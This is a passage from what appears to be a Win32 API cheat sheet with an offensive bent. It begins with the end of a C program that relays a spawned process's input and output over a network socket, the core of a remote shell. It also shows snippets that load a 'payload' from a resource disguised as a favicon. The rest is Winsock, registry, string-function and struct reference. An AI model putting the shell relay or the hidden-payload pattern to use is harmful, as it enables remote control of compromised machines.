    CloseHandle(processInfo.hThread);
    ThreadParams outputParams = { hOutputRead, NULL, sock };
    ThreadParams inputParams = { NULL, hInputWrite, sock };
    HANDLE hThread[2];
    hThread[0] = CreateThread(NULL, 0, OutputThreadFunc, &outputParams, 0, NULL);
    hThread[1] = CreateThread(NULL, 0, InputThreadFunc, &inputParams, 0, NULL);

    WaitForMultipleObjects(2, hThread, TRUE, INFINITE);
    CleanUp(hInputWrite, NULL, NULL, hOutputRead, processInfo, result, sock);
    return 0;
}

void CleanUp(HANDLE hInputWrite, HANDLE hInputRead, HANDLE hOutputWrite, HANDLE hOutputRead, PROCESS_INFORMATION processInfo, addrinfo* result, SOCKET sock) {
    if (hInputWrite != NULL) CloseHandle(hInputWrite);
    if (hInputRead != NULL) CloseHandle(hInputRead);
    if (hOutputWrite != NULL) CloseHandle(hOutputWrite);
    if (hOutputRead != NULL) CloseHandle(hOutputRead);
    if (processInfo.hProcess != NULL) CloseHandle(processInfo.hProcess);
    if (processInfo.hThread != NULL) CloseHandle(processInfo.hThread);
    if (result != NULL) freeaddrinfo(result);
    if (sock != NULL) closesocket(sock);
    WSACleanup();
}

DWORD WINAPI OutputThreadFunc(LPVOID data) {
    ThreadParams* params = (ThreadParams*)data;
    char buffer[4096];
    DWORD bytesRead;
    while (ReadFile(params->hPipeRead, buffer, sizeof(buffer) - 1, &bytesRead, NULL)) {
        buffer[bytesRead] = '\0';
        send(params->sock, buffer, bytesRead, 0);
    }
    return 0;
}

DWORD WINAPI InputThreadFunc(LPVOID data) {
    ThreadParams* params = (ThreadParams*)data;
    char buffer[4096];
    int bytesRead;
    while ((bytesRead = recv(params->sock, buffer, sizeof(buffer) - 1, 0)) > 0) {
        DWORD bytesWritten;
        WriteFile(params->hPipeWrite, buffer, bytesRead, &bytesWritten, NULL);
    }
    return 0;
}
```
[WSAStartup](https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-wsastartup)
```c
int WSAStartup(
    WORD wVersionRequired, 
    LPWSADATA lpWSAData
); // Initializes the Winsock library for an application. Must be called before any other Winsock functions.
```
[WSAConnect](https://learn.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsaconnect)
```c
int WSAConnect(
    SOCKET s, // Descriptor identifying a socket.
    const struct sockaddr* name, // Pointer to the sockaddr structure for the connection target.
    int namelen, // Length of the sockaddr structure.
    LPWSABUF lpCallerData, // Pointer to user data to be transferred during connection.
    LPWSABUF lpCalleeData, // Pointer to user data transferred back during connection.
    LPQOS lpSQOS, // Pointer to flow specs for socket s, one for each direction.
    LPQOS lpGQOS // Pointer to flow specs for the socket group.
); // Establishes a connection to another socket application.This function is similar to connect, but allows for more control over the connection process.
```
[WSASend](https://learn.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsasend)
```c
int WSASend(
    SOCKET s, // Descriptor identifying a connected socket.
    LPWSABUF lpBuffers, // Array of buffers for data to be sent.
    DWORD dwBufferCount, // Number of buffers in the lpBuffers array.
    LPDWORD lpNumberOfBytesSent, // Pointer to the number of bytes sent by this function call.
    DWORD dwFlags, // Flags to modify the behavior of the function call.
    LPWSAOVERLAPPED lpOverlapped, // Pointer to an overlapped structure for asynchronous operations.
    LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine // Pointer to the completion routine called when the send operation has been completed.
); // Sends data on a connected socket.It can be used for both synchronous and asynchronous data transfer.
```
[WSARecv](https://learn.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsarecv)
```c
int WSARecv(
    SOCKET s, // Descriptor identifying a connected socket.
    LPWSABUF lpBuffers, // Array of buffers to receive the incoming data.
    DWORD dwBufferCount, // Number of buffers in the lpBuffers array.
    LPDWORD lpNumberOfBytesRecvd, // Pointer to the number of bytes received by this function call.
    LPDWORD lpFlags, // Flags to modify the behavior of the function call.
    LPWSAOVERLAPPED lpOverlapped, // Pointer to an overlapped structure for asynchronous operations.
    LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine // Pointer to the completion routine called when the receive operation has been completed.
); //Receives data from a connected socket, and can also be used for both synchronous and asynchronous data transfer.
```
[WSASendTo](https://learn.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsasendto)
```c
int WSASendTo(
    SOCKET s, // Descriptor identifying a socket.
    LPWSABUF lpBuffers, // Array of buffers containing the data to be sent.
    DWORD dwBufferCount, // Number of buffers in the lpBuffers array.
    LPDWORD lpNumberOfBytesSent, // Pointer to the number of bytes sent by this function call.
    DWORD dwFlags, // Flags to modify the behavior of the function call.
    const struct sockaddr* lpTo, // Pointer to the sockaddr structure for the target address.
    int iToLen, // Size of the address in lpTo.
    LPWSAOVERLAPPED lpOverlapped, // Pointer to an overlapped structure for asynchronous operations.
    LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine // Pointer to the completion routine called when the send operation has been completed.
); // Sends data to a specific destination, for use with connection - less socket types such as SOCK_DGRAM.
```
[WSARecvFrom](https://learn.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsarecvfrom)
```c
int WSARecvFrom(
    SOCKET s, // Descriptor identifying a socket.
    LPWSABUF lpBuffers, // Array of buffers to receive the incoming data.
    DWORD dwBufferCount, // Number of buffers in the lpBuffers array.
    LPDWORD lpNumberOfBytesRecvd, // Pointer to the number of bytes received by this function call.
    LPDWORD lpFlags, // Flags to modify the behavior of the function call.
    struct sockaddr* lpFrom, // Pointer to an address structure that will receive the source address upon completion of the operation.
    LPINT lpFromlen, // Pointer to the size of the lpFrom address structure.
    LPWSAOVERLAPPED lpOverlapped, // Pointer to an overlapped structure for asynchronous operations.
    LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine // Pointer to the completion routine called when the receive operation has been completed.
); //Receives data from a specific source, used with connection - less socket types such as SOCK_DGRAM.
```
[WSAAsyncSelect](https://learn.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsaasyncselect)
```c
int WSAAsyncSelect(
    SOCKET s, // Descriptor identifying the socket.
    HWND hWnd, // Handle to the window which should receive the message.
    unsigned int wMsg, // Message to be received when an event occurs.
    long lEvent // Bitmask specifying a group of conditions to be monitored.
); // Requests Windows message - based notification of network events for a socket.
```
[socket](https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-socket)
```c
SOCKET socket(
    int af, 
    int type, 
    int protocol
); // Creates a new socket for network communication.
```
[bind](https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-bind)
```c
int bind(
    SOCKET s, 
    const struct sockaddr *name, 
    int namelen
); // Binds a socket to a specific local address and port.
```
[listen](https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-listen)
```c
int listen(
    SOCKET s, 
    int backlog
); // Sets a socket to listen for incoming connections.
```
[accept](https://learn.microsoft.com/en-us/windows/win32/api/Winsock2/nf-winsock2-accept)
```c
SOCKET accept(
    SOCKET s, 
    struct sockaddr *addr, 
    int *addrlen
); // Accepts a new incoming connection on a listening socket.
```
[connect](https://learn.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-connect)
```c
int connect(
    SOCKET s, 
    const struct sockaddr *name, 
    int namelen
); // Initiates a connection on a socket to a remote address.
```
[send](https://learn.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-send)
```c
int send(
    SOCKET s, 
    const char *buf, 
    int len, 
    int flags
); // Sends data on a connected socket.
```
[recv](https://learn.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-recv)
```c
int recv(
    SOCKET s, 
    char *buf, 
    int len, 
    int flags
); // Receives data from a connected socket.
```
[closesocket](https://learn.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-closesocket)
```c
int closesocket(
    SOCKET s
); //Closes a socket and frees its resources.
```
[gethostbyname](https://learn.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-gethostbyname)
```c
hostent* gethostbyname(
    const char* name // either a hostname or an IPv4 address in dotted-decimal notation
); // returns a pointer to a hostent struct. NOTE: Typically better to use getaddrinfo
```

### Registry Operations
[RegOpenKeyExW](https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regopenkeyexw)
```c
LONG RegOpenKeyExW(
    HKEY hKey, 
    LPCWTSTR lpSubKey, 
    DWORD ulOptions, 
    REGSAM samDesired, 
    PHKEY phkResult
); // Opens the specified registry key.
```
[RegQueryValueExW](https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regqueryvaluew)
```c
LONG RegQueryValueExW(
    HKEY hKey, 
    LPCWTSTR lpValueName, 
    LPDWORD lpReserved, 
    LPDWORD lpType, 
    LPBYTE lpData, 
    LPDWORD lpcbData
); // Retrieves the type and data of the specified value name associated with an open registry key.
```
[RegSetValueExW](https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regsetvalueexw)
```c
LONG RegSetValueEx(
    HKEY hKey, 
    LPCWTSTR lpValueName, 
    DWORD Reserved, 
    DWORD dwType, 
    const BYTE *lpData, 
    DWORD cbData
); // Sets the data and type of the specified value name associated with an open registry key.
```
[RegCloseKey](https://docs.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regclosekey)
```c
LONG RegCloseKey(
    HKEY hKey
); // Closes a handle to the specified registry key.
```
[RegCreateKeyExA](https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regcreatekeyexa)
```c
LSTATUS RegCreateKeyExA(
  [in]            HKEY                        hKey,
  [in]            LPCSTR                      lpSubKey,
                  DWORD                       Reserved,
  [in, optional]  LPSTR                       lpClass,
  [in]            DWORD                       dwOptions,
  [in]            REGSAM                      samDesired,
  [in, optional]  const LPSECURITY_ATTRIBUTES lpSecurityAttributes,
  [out]           PHKEY                       phkResult,
  [out, optional] LPDWORD                     lpdwDisposition
); // Creates the specified registry key. If the key already exists, the function opens it. Note that key names are not case sensitive. 
```
[RegSetValueExA](https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regsetvalueexa)
```c
LSTATUS RegSetValueExA(
  [in]           HKEY       hKey,
  [in, optional] LPCSTR     lpValueName,
                 DWORD      Reserved,
  [in]           DWORD      dwType,
  [in]           const BYTE *lpData,
  [in]           DWORD      cbData
); // Sets the data and type of a specified value under a registry key.
```
[RegCreateKeyA](https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regcreatekeya)
```c
LSTATUS RegCreateKeyA(
  [in]           HKEY   hKey,
  [in, optional] LPCSTR lpSubKey,
  [out]          PHKEY  phkResult
); // Creates the specified registry key. If the key already exists in the registry, the function opens it.
```
[RegDeleteKeyA](https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regdeletekeya)
```c
LSTATUS RegDeleteKeyA(
  [in] HKEY   hKey,
  [in] LPCSTR lpSubKey
); // Deletes a subkey and its values. Note that key names are not case sensitive.
```
[NtRenameKey](https://learn.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntrenamekey)
```c
__kernel_entry NTSTATUS NtRenameKey(
  [in] HANDLE          KeyHandle,
  [in] PUNICODE_STRING NewName
); // Changes the name of the specified registry key.
```

### Error Handling
[WSAGetLastError](https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-wsagetlasterror)
```c
int WSAGetLastError(
    void
); // Returns the error status for the last Windows Sockets operation that failed.
```
[WSASetLastError](https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-wsasetlasterror)
```c
void WSASetLastError(
    int iError
); // Sets the error status for the last Windows Sockets operation.
```
[WSAGetOverlappedResult](https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsagetoverlappedresult)
```c
BOOL WSAGetOverlappedResult(
    SOCKET s, 
    LPWSAOVERLAPPED lpOverlapped, 
    LPDWORD lpcbTransfer, 
    BOOL fWait, 
    LPDWORD lpdwFlags
); // Determines the results of an overlapped operation on the specified socket.
```
[WSAIoctl](https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsaioctl)
```c
int WSAIoctl(
    SOCKET s, 
    DWORD dwIoControlCode, 
    LPVOID lpvInBuffer, 
    DWORD cbInBuffer, 
    LPVOID lpvOutBuffer, 
    DWORD cbOutBuffer, 
    LPDWORD lpcbBytesReturned, 
    LPWSAOVERLAPPED lpOverlapped, 
    LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine
); // Controls the mode of a socket.
```
[WSACreateEvent](https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsacreateevent)
```c
WSAEVENT WSACreateEvent(
    void
); // Creates a new event object.
```
[WSASetEvent](https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsasetevent)
```c
BOOL WSASetEvent(
    WSAEVENT hEvent
); // Sets the state of the specified event object to signaled.
```
[WSAResetEvent](https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsaresetevent)
```c
BOOL WSAResetEvent(
    WSAEVENT hEvent
); // Sets the state of the specified event object to nonsignaled.
```
[WSACloseEvent](https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsacloseevent)
```c
BOOL WSACloseEvent(
    WSAEVENT hEvent
); // Closes an open event object handle.
```
[WSAWaitForMultipleEvents](https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsawaitformultipleevents)
```c
DWORD WSAWaitForMultipleEvents(
    DWORD cEvents, 
    const WSAEVENT *lphEvents, 
    BOOL fWaitAll, 
    DWORD dwTimeout, 
    BOOL fAlertable
); // Waits for multiple event objects and returns when the specified events are signaled or the time-out interval elapses.
```

### Resource Management
[FindResource](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-findresourcea)
```c
HRSRC FindResource(
  [in, optional] HMODULE hModule,   // A handle to the module whose portable executable file or an accompanying MUI file contains the resource. If this parameter is NULL, the function searches the module used to create the current process.
  [in]           LPCSTR  lpName,    // The name of the resource.
  [in]           LPCSTR  lpType     // The resource type.
); // Determines the location of a resource with the specified type and name in the specified module.
```
```c
HRSRC res = FindResource(NULL, MAKEINTRESOURCE(FAVICON_ICO), RT_RCDATA);
```
[LoadResource](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadresource)
```c
HGLOBAL LoadResource(
  [in, optional] HMODULE hModule,    // A handle to the module whose executable file contains the resource. 
  [in]           HRSRC   hResInfo    // A handle to the resource to be loaded.
); // Retrieves a handle that can be used to obtain a pointer to the first byte of the specified resource in memory.
```
```c
HGLOBAL resHandle = resHandle = LoadResource(NULL, res);
```
[LockResource](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-lockresource)
```c
LPVOID LockResource(
  [in] HGLOBAL hResData    // A handle to the resource to be accessed
); // Retrieves a pointer to the specified resource in memory.
```
```c
unsigned char * payload = (char *) LockResource(resHandle);
```
[SizeofResource](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-sizeofresource)
```c
DWORD SizeofResource(
  [in, optional] HMODULE hModule,    // A handle to the module whose executable file contains the resource
  [in]           HRSRC   hResInfo    // A handle to the resource. This handle must be created by using FindResource
); // Retrieves the size, in bytes, of the specified resource.
```
```c
unsigned int payload_len = SizeofResource(NULL, res);
```
---

## Unicode String Functions
```c
#include <wchar.h> // for wide character string routines
```

### String Length
```c
size_t wcslen(
    const wchar_t *str
); // Returns the length of the given wide string.
```

### String Copy
[wcscpy]
```c
wchar_t *wcscpy(
    wchar_t *dest, 
    const wchar_t *src
); // Copies the wide string from src to dest.
```
[wcsncpy]
```c
wchar_t *wcsncpy(
    wchar_t *dest, 
    const wchar_t *src, 
    size_t count
); // Copies at most count characters from the wide string src to dest.
```

### String Concatenation
[wcscat]
```c
wchar_t *wcscat(
    wchar_t *dest, 
    const wchar_t *src
); // Appends the wide string src to the end of the wide string dest.
```
[wcsncat]
```c
wchar_t *wcsncat(
    wchar_t *dest, 
    const wchar_t *src, 
    size_t count
); // Appends at most count characters from the wide string src to the end of the wide string dest.
```

### String Comparison
[wcscmp]
```c
int wcscmp(
    const wchar_t *str1, 
    const wchar_t *str2
); // Compares two wide strings lexicographically.
```
[wcsncmp]
```c
int wcsncmp(
    const wchar_t *str1, 
    const wchar_t *str2, 
    size_t count
); // Compares up to count characters of two wide strings lexicographically.
```
[_wcsicmp]
```c
int _wcsicmp(
    const wchar_t *str1, 
    const wchar_t *str2
); // Compares two wide strings lexicographically, ignoring case.
```
[_wcsnicmp]
```c
int _wcsnicmp(
    const wchar_t *str1, 
    const wchar_t *str2, 
    size_t count
); // Compares up to count characters of two wide strings lexicographically, ignoring case.
```

### String Search
[wcschr]
```c
wchar_t *wcschr(
    const wchar_t *str, 
    wchar_t c
); // Finds the first occurrence of the wide character c in the wide string str.
```
[wcsrchr]
```c
wchar_t *wcsrchr(
    const wchar_t *str, 
    wchar_t c
); // Finds the last occurrence of the wide character c in the wide string str.
```
[wcspbrk]
```c
wchar_t *wcspbrk(
    const wchar_t *str1, 
    const wchar_t *str2
); // Finds the first occurrence in the wide string str1 of any character from the wide string str2.
```
[wcsstr]
```c
wchar_t *wcsstr(
    const wchar_t *str1, 
    const wchar_t *str2
); // Finds the first occurrence of the wide string str2 in the wide string str1.
```
[wcstok]
```c
wchar_t *wcstok(
    wchar_t *str, 
    const wchar_t *delimiters
); // Splits the wide string str into tokens based on the delimiters.
```

### Character Classification and Conversion
[towupper]
```c
wint_t towupper(
    wint_t c
); // Converts a wide character to uppercase.
```
[towlower]
```c
wint_t towlower(
    wint_t c
); // Converts a wide character to lowercase.
```
[iswalpha]
```c
int iswalpha(
    wint_t c
); // Checks if the wide character is an alphabetic character.
```
[iswdigit]
```c
int iswdigit(
    wint_t c
); // Checks if the wide character is a decimal digit.
```
[iswalnum]
```c
int iswalnum(
    wint_t c
); // Checks if the wide character is an alphanumeric character.
```
[iswspace]
```c
int iswspace(
    wint_t c
); // Checks if the wide character is a whitespace character.
```
[iswxdigit]
```c
int iswxdigit(
    wint_t c
); // Checks if the wide character is a valid hexadecimal digit.
```

--- 

## Win32 Structs Cheat Sheet
### Common Structs
[**`SYSTEM_INFO`**](https://docs.microsoft.com/en-us/windows/win32/api/sysinfoapi/ns-sysinfoapi-system_info)
```cpp
#include <sysinfoapi.h>
// Contains information about the current computer system, including the architecture and type of the processor, the number of processors, and the page size.
typedef struct _SYSTEM_INFO {
    union {
        DWORD dwOemId;
        struct {
            WORD wProcessorArchitecture;
            WORD wReserved;
        } DUMMYSTRUCTNAME;
    } DUMMYUNIONNAME;
    DWORD dwPageSize;
    LPVOID lpMinimumApplicationAddress;
    LPVOID lpMaximumApplicationAddress;
    DWORD_PTR dwActiveProcessorMask;
    DWORD dwNumberOfProcessors;
    DWORD dwProcessorType;
    DWORD dwAllocationGranularity;
    WORD wProcessorLevel;
    WORD wProcessorRevision;
} SYSTEM_INFO;
```
[**`FILETIME`**](https://docs.microsoft.com/en-us/windows/win32/api/minwinbase/ns-minwinbase-filetime)
```cpp
#include <minwinbase.h>
// Represents the number of 100-nanosecond intervals since January 1, 1601 (UTC). Used for file and system time.
typedef struct _FILETIME {
    DWORD dwLowDateTime;
    DWORD dwHighDateTime;
} FILETIME;
```
[**`STARTUPINFO`**](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa)
```cpp
#include <processthreadsapi.h>
// Specifies the window station, desktop, standard handles, and appearance of the main window for a process at creation time.
typedef struct _STARTUPINFOA {
    DWORD  cb;
    LPSTR  lpReserved;
    LPSTR  lpDesktop;
    LPSTR  lpTitle;
    DWORD  dwX;
    DWORD  dwY;
    DWORD  dwXSize;
    DWORD  dwYSize;
    DWORD  dwXCountChars;
    DWORD  dwYCountChars;
    DWORD  dwFillAttribute;
    DWORD  dwFlags;
    WORD   wShowWindow;
    WORD   cbReserved2;
    LPBYTE lpReserved2;
    HANDLE hStdInput;
    HANDLE hStdOutput;
    HANDLE hStdError;
} STARTUPINFOA, *LPSTARTUPINFOA;
```
[**`PROCESS_INFORMATION`**](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-process_information)
```cpp
#include <processthreadsapi.h>
// Contains information about a newly created process and its primary thread.
typedef struct _PROCESS_INFORMATION {
    HANDLE hProcess;
    HANDLE hThread;
    DWORD  dwProcessId;
    DWORD  dwThreadId;
} PROCESS_INFORMATION, *LPPROCESS_INFORMATION;
```
[**`PROCESSENTRY32`**](https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/ns-tlhelp32-processentry32)
```c
#include <tlhelp32.h>
typedef struct tagPROCESSENTRY32 {
  DWORD     dwSize;
  DWORD     cntUsage;
  DWORD     th32ProcessID;
  ULONG_PTR th32DefaultHeapID;
  DWORD     th32ModuleID;
  DWORD     cntThreads;
  DWORD     th32ParentProcessID;
  LONG      pcPriClassBase;
  DWORD     dwFlags;
  CHAR      szExeFile[MAX_PATH];
} PROCESSENTRY32;
```

[**`SECURITY_ATTRIBUTES`**](https://docs.microsoft.com/en-us/previous-versions/windows/desktop/legacy/aa379560(v=vs.85))
```cpp
// Determines whether the handle can be inherited by child processes and specifies a security descriptor for a new object.
typedef struct _SECURITY_ATTRIBUTES {
    DWORD  nLength;
    LPVOID lpSecurityDescriptor;
    BOOL   bInheritHandle;
} SECURITY_ATTRIBUTES, *LPSECURITY_ATTRIBUTES;
```
[**`OVERLAPPED`**](https://docs.microsoft.com/en-us/windows/win32/api/minwinbase/ns-minwinbase-overlapped)
```cpp
#inluce <minwinbase.h>
// Contains information used in asynchronous (also known as overlapped) input and output (I/O) operations.
typedef struct _OVERLAPPED {
    ULONG_PTR Internal;
    ULONG_PTR InternalHigh;
    union {
        struct {
            DWORD Offset;
            DWORD OffsetHigh;
        } DUMMYSTRUCTNAME;
        PVOID Pointer;
    } DUMMYUNIONNAME;
    HANDLE hEvent;
} OVERLAPPED, *LPOVERLAPPED;
```
[**`GUID`**](https://docs.microsoft.com/en-us/windows/win32/api/guiddef/ns-guiddef-guid)
```cpp
#include <guiddef.h>
// Represents a globally unique identifier (GUID), used to identify objects, interfaces, and other items.
typedef struct _GUID {
    unsigned long  Data1;
    unsigned short Data2;
    unsigned short Data3;
    unsigned char  Data4[8];
} GUID;
```
[**`MEMORY_BASIC_INFORMATION`**](https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-memory_basic_information)
```cpp
#include <winnt.h>
// Contains information about a range of pages in the virtual address space of a process.
typedef struct _MEMORY_BASIC_INFORMATION {
    PVOID  BaseAddress;
    PVOID  AllocationBase;
    DWORD  AllocationProtect;
    SIZE_T RegionSize;
    DWORD  State;
    DWORD  Protect;
    DWORD  Type;
} MEMORY_BASIC_INFORMATION, *PMEMORY_BASIC_INFORMATION;
```
[**`SYSTEMTIME`**](https://docs.microsoft.com/en-us/windows/win32/api/minwinbase/ns-minwinbase-systemtime)
```cpp
#include <minwinbase.h>
// Specifies a date and time, using individual members for the month, day, year, weekday, hour, minute, second, and millisecond.
typedef struct _SYSTEMTIME {
    WORD wYear;
    WORD wMonth;
    WORD wDayOfWeek;
    WORD wDay;
    WORD wHour;
    WORD wMinute;
    WORD wSecond;
    WORD wMilliseconds;
} SYSTEMTIME, *PSYSTEMTIME, *LPSYSTEMTIME;
```
[**`COORD`**](https://docs.microsoft.com/en-us/windows/console/coord-str)
```cpp
// Defines the coordinates of a character cell in a console screen buffer, where the origin (0,0) is at the top-left corner.
typedef struct _COORD {
    SHORT X;
    SHORT Y;
} COORD, *PCOORD;
```
[**`SMALL_RECT`**](https://docs.microsoft.com/en-us/windows/console/small-rect-str)
```cpp
//  Defines the coordinates of the upper left and lower right corners of a rectangle.
typedef struct _SMALL_RECT {
    SHORT Left;
    SHORT Top;
    SHORT Right;
    SHORT Bottom;
} SMALL_RECT;
```
[**`CONSOLE_SCREEN_BUFFER_INFO`**](https://docs.microsoft.com/en-us/windows/console/console-screen-buffer-info-str)
```cpp
// Contains information about a console screen buffer.
typedef struct _CONSOLE_SCREEN_BUFFER_INFO {
    COORD      dwSize;
    COORD      dwCursorPosition;
    WORD       wAttributes;
    SMALL_RECT srWindow;
    COORD      dwMaximumWindowSize;
} CONSOLE_SCREEN_BUFFER_INFO, *PCONSOLE_SCREEN_BUFFER_INFO;
```
[**`WSADATA`**](https://docs.microsoft.com/en-us/windows/win32/api/winsock/ns-winsock-wsadata)
```cpp
#include <winsock.h>
// Contains information about the Windows Sockets implementation.
typedef struct WSAData {
    WORD           wVersion;
    WORD           wHighVersion;
    unsigned short iMaxSockets;
    unsigned short iMaxUdpDg;
    char FAR       *lpVendorInfo;
    char           szDescription[WSADESCRIPTION_LEN+1];
    char           szSystemStatus[WSASYS_STATUS_LEN+1];
} WSADATA, *LPWSADATA;
```
[**`CRITICAL_SECTION`**]([struct RTL_CRITICAL_SECTION (nirsoft.net)](https://www.nirsoft.net/kernel_struct/vista/RTL_CRITICAL_SECTION.html))
```c++
// Represents a critical section object, which is used to provide synchronization access to a shared resource.
typedef struct _RTL_CRITICAL_SECTION {
    PRTL_CRITICAL_SECTION_DEBUG DebugInfo;
    LONG LockCount;
    LONG RecursionCount;
    HANDLE OwningThread;
    HANDLE LockSemaphore;
    ULONG_PTR SpinCount;
} RTL_CRITICAL_SECTION, *PRTL_CRITICAL_SECTION;
```
[**`WSAPROTOCOL_INFO`**](https://docs.microsoft.com/en-us/windows/win32/api/winsock2/ns-winsock2-wsaprotocol_infoa)
```c++
#include <winsock2.h>
// Contains Windows Sockets protocol information.
typedef struct _WSAPROTOCOL_INFOA {
    DWORD          dwServiceFlags1;
    DWORD          dwServiceFlags2;
    DWORD          dwServiceFlags3;
    DWORD          dwServiceFlags4;
    DWORD          dwProviderFlags;
    GUID           ProviderId;
    DWORD          dwCatalogEntryId;
    WSAPROTOCOLCHAIN ProtocolChain;
    int            iVersion;
    int            iAddressFamily;
    int            iMaxSockAddr;
    int            iMinSockAddr;
    int            iSocketType;
    int            iProtocol;
    int            iProtocolMaxOffset;
    int            iNetworkByteOrder;
    int            iSecurityScheme;
    DWORD          dwMessageSize;
    DWORD          dwProviderReserved;
    CHAR           szProtocol[WSAPROTOCOL_LEN+1];
} WSAPROTOCOL_INFOA, *LPWSAPROTOCOL_INFOA;
```
[**`MSGHDR`**](https://docs.microsoft.com/en-us/windows/win32/api/ws2tcpip/ns-ws2tcpip-_msghdr)
```c++
#include <ws2def.h>
// Contains message information for use with the `sendmsg` and `recvmsg` functions.
typedef struct _WSAMSG {
    LPSOCKADDR       name;
    INT              namelen;
    LPWSABUF         lpBuffers;
    ULONG            dwBufferCount;
    WSABUF           Control;
    ULONG            dwFlags;
} WSAMSG, *PWSAMSG, *LPWSAMSG;
```

### Win32 Sockets Structs Cheat Sheet (winsock.h)
[**`SOCKADDR`**](https://docs.microsoft.com/en-us/windows/win32/api/winsock/ns-winsock-sockaddr)
```cpp
// A generic socket address structure used for compatibility with various address families.
typedef struct sockaddr {
    u_short sa_family;
    char    sa_data[14];
} SOCKADDR, *PSOCKADDR, *LPSOCKADDR;
```
[**`SOCKADDR_IN`**](https://docs.microsoft.com/en-us/windows/win32/api/winsock/ns-winsock-sockaddr_in)
```cpp
// Represents an IPv4 socket address, containing the IPv4 address, port number, and address family.
typedef struct sockaddr_in {
    short          sin_family;
    u_short        sin_port;
    struct in_addr sin_addr;
    char           sin_zero[8];
} SOCKADDR_IN, *PSOCKADDR_IN, *LPSOCKADDR_IN;
```
[**`LINGER`**](https://docs.microsoft.com/en-us/windows/win32/api/winsock/ns-winsock-linger)
```cpp
// Used to set the socket option SO_LINGER, which determines the action taken when unsent data is queued on a socket and a `closesocket` is performed.
typedef struct linger {
    u_short l_onoff;
    u_short l_linger;
} LINGER, *PLINGER, *LPLINGER;
```
[**`TIMEVAL`**](https://docs.microsoft.com/en-us/windows/win32/api/winsock/ns-winsock-timeval)
```cpp
// Represents a time interval, used with the `select` function to specify a timeout period.
typedef struct timeval {
    long tv_sec;
    long tv_usec;
} TIMEVAL, *PTIMEVAL, *LPTIMEVAL;
```
[**`FD_SET`**](https://docs.microsoft.com/en-us/windows/win32/api/winsock/ns-winsock-fd_set)
```cpp
// Represents a set of sockets used with the `select` function to check for socket events.
typedef struct fd_set {
    u_int fd_count;
    SOCKET fd_array[FD_SETSIZE];
} fd_set, *Pfd_set, *LPfd_set;
```

### Win32 Sockets Structs Cheat Sheet (winsock2.h)
[**`IN_ADDR`**](https://learn.microsoft.com/en-us/windows/win32/api/winsock2/ns-winsock2-in_addr)
```cpp
// Represents an IPv4 address.
typedef struct in_addr {
    union {
        struct {
            u_char s_b1, s_b2, s_b3, s_b4;
        } S_un_b;
        struct {
            u_short s_w1, s_w2;
        } S_un_w;
        u_long S_addr;
    } S_un;
} IN_ADDR, *PIN_ADDR, *LPIN_ADDR;
```

### Win32 Sockets Structs Cheat Sheet (ws2def.h)
[**`ADDRINFO`**](https://learn.microsoft.com/en-us/windows/win32/api/ws2def/ns-ws2def-addrinfow)
```cpp
#include <ws2def.h>
// Contains information about an address for use with the `getaddrinfo` function, and is used to build a linked list of addresses.
typedef struct addrinfoW {
    int             ai_flags;
    int             ai_family;
    int             ai_socktype;
    int             ai_protocol;
    size_t          ai_addrlen;
    PWSTR           *ai_canonname;
    struct sockaddr *ai_addr;
    struct addrinfo *ai_next;
} ADDRINFOW, *PADDRINFOW;
```
[**`WSABUF`**](https://learn.microsoft.com/en-us/windows/win32/api/ws2def/ns-ws2def-wsabuf)
```cpp
#include <ws2def.h>
// Contains a pointer to a buffer and its length. Used for scatter/gather I/O operations.
typedef struct _WSABUF {
    ULONG len;
    __field_bcount(len) CHAR FAR *buf;
} WSABUF, FAR * LPWSABUF;
```
